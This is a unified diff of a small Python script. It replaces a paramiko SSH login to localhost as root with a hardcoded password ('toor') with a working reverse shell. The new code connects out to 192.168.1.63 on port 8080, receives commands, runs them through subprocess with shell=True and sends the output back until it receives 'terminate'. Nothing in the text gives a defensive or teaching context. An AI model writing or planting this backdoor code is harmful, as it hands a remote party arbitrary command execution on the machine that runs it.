@@ -1,11 +1,19 @@
-import paramiko
+import socket
+import subprocess
 
 def connect():
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    client.connect('localhost',usurname='root',password='toor')
-    chan = client.get_transport().open_session()
-    chan.send("Connected Successfully :)) ")
-    print chan.recv(1024)
+    s = socket.socket()
+    s.connect(("192.168.1.63",8080))
+    while True:
+        command = s.recv(1024)
+        if 'terminate' in command.decode():
+            s.close()
+            break
+        else:
+            CMD = subprocess.Popen(command.decode(),shell = True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            s.send(CMD.stdout.read())
+            s.send(CMD.stderr.read())
 
-connect()
+def main():
+    connect()
+main()
